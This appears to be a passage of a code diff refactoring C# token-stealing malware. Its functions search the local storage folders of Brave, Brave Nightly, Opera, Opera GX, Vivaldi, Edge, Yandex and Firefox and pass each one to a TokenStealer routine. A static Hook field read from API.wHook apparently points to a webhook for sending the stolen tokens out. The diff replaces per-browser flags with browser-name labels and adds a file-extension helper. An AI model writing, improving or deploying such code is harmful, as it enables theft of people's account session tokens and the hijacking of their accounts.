 			{
-				Brave = true;
-				List<string> list = TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					Brave = true;
-				}
+				TokenStealer(folder, "Brave");
 			}
 		}
-
-		private static void StealTokenFromBraveNightly()
+		private void StealTokenFromBraveNightly()
 		{
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser-Nightly\\User Data\\";
 			if (!Directory.Exists(path)) return;
 			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
 			{
-				Brave_Nightly = true;
-				List<string> list = TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					Brave_Nightly = true;
-				}
+				TokenStealer(folder, "Brave Nightly");
 			}
 		}
-
-		private static void StealTokenFromOpera()
+		private void StealTokenFromOpera()
 		{
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\";
 			DirectoryInfo folder = new DirectoryInfo(path);
 			if (Directory.Exists(path))
 			{
-				Opera = true;
-				List<string> list = TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					Opera = true;
-				}
+				TokenStealer(folder, "Opera");
 			}
 		}
-
-		private static void StealTokenFromVivaldi()
+		private void StealTokenFromVivaldi()
 		{
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Vivaldi\\User Data\\";
 			if (!Directory.Exists(path)) return;
 			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
 			{
-				Vivaldi = true;
-				List<string> list = TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					Vivaldi = true;
-				}
+				TokenStealer(folder, "Vivaldi");
 			}
 		}
-		private static void StealTokenFromOperaGX()
+		private void StealTokenFromOperaGX()
 		{
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\";
 			DirectoryInfo folder = new DirectoryInfo(path);
             if (folder.Exists)
 			{
-				OperaGX = true;
-				List<string> list = TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					OperaGX = true;
-				}
+				TokenStealer(folder, "OperaGX");
 			}
 		}
-
-		private static void StealTokenFromEdge()
+        private void StealTokenFromEdge()
 		{
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\";
 			if (!Directory.Exists(path)) return;
 			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
 			{
-				Edge = true;
-				List<string> list = TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					Edge = true;
-				}
+				TokenStealer(folder, "Edge");
 			}
 		}
-
-		private static void StealTokenFromYandex()
+		private void StealTokenFromYandex()
 		{
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\";
 			if (!Directory.Exists(path)) return;
 			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
 			{
-				Yandex = true;
-				List<string> list = TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					Yandex = true;
-				}
+				TokenStealer(folder, "Yandex");
 			}
 		}
-
-		private static void StealTokenFromFirefox()
+		private void StealTokenFromFirefox()
 		{
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\"; 
 			if (Directory.Exists(path))
 			{
 				foreach (string text in Directory.EnumerateFiles(path, "webappsstore.sqlite", SearchOption.AllDirectories))
 				{
-					Firefox = true;
-					List<string> list = TokenStealer(new DirectoryInfo(text.Replace("webappsstore.sqlite", "")), false);
-					if (list != null && list.Count > 0)
-					{
-						Firefox = true;
-					}
+					TokenStealer(new DirectoryInfo(text.Replace("webappsstore.sqlite", "")), "Firefox");
 				}
 			}
 		}
-
-		private static List<string> CheckedTokens = new List<string>();
-
+        
+		private static readonly List<string> SavedTokens = new List<string>();
 		public static string Hook = API.wHook;
-
-		private static bool Development = false;
-
-		private static bool Edge = false;
-
-		private static bool App = false;
-
-		private static bool Canary = false;
-
-		private static bool PTB = false;
-
-		private static bool Chrome = false;
-
-		private static bool Opera = false;
-
-		private static bool OperaGX = false;
-
-		private static bool Vivaldi = false;
-
-		private static bool Brave = false;
-
-		private static bool Yandex = false;
-
-		private static bool Firefox = false;
-
-		private static bool Brave_Nightly = false;
-
-		private static bool Found = false;
+	}
+	public static class GetFilesExtension
+	{
+		public static IEnumerable<FileInfo> GetFilesNew(this DirectoryInfo dir, params string[] ext)
+		{
+			return dir.EnumerateFiles().Where(file => ext.Contains(file.Extension));
+		}
 	}
 }
